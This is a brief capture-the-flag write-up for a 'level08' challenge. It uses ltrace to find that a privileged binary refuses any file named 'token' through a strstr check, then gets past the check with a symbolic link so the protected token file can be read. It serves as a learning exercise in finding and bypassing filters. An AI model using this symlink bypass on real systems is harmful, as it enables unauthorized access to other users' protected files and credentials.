we can see that in home directory of  Level08 there is executable file with name level08 that has permission of the user flag08

$>./Level08
./level08 [file to read]
$>./level08 token
You may not access 'token'

$>ltrace ./level08 token
[...]
strstr("token", "token")                                                = "token"
printf("You may not access '%s'\n", "token"You may not access 'token')
[...]

we see that level08 use strstr to check if the file name is 'token' and print 'You may not access' if its true.
so we have to change the name of the file or just use ln.

$>ln -s token to
$>./Level08 to
